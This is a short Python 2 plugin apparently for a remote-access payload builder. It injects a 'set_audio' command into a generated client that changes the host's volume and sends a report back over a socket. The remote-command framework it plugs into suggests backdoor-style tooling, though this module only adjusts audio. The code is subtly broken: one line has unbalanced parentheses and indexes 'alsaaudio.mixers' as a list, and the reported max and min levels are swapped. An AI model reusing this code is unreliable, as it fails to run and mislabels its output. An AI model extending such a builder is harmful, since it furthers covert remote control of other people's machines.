# verified
import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('import alsaaudio')
        config.functions.append('''
def set_audio(data):
    vol_level = data.split(' ',1)[1]
    vol = alsaaudio.Mixer((alsaaudio.mixers[0])
    vol.setvolume(int(vol_level))
    volume_range = vol.getrange()
    data = '[*]Max level : ' + str(volume_range[0])
    data += '\\n[*]Mininum level : ' + str(volume_range[1])
    data += '\\n[+]Set volume to : ' + str(vol_level)
    s.sendall(data)''')
        config.logics.append('''
            elif command == "set_audio":
                set_audio(data)''')
        config.help_menu['set_audio <number>'] = 'Set system wide audio level by percentage'
    elif option == 'info':
        print '\nName             : Set Audio component' \
              '\nOS               : Linux' \
              '\nRequired Modules : alsaaudio (external)' \
              '\nCommands         : set_audio <number>' \
              '\nDescription      : Sets the system audio levels\n'
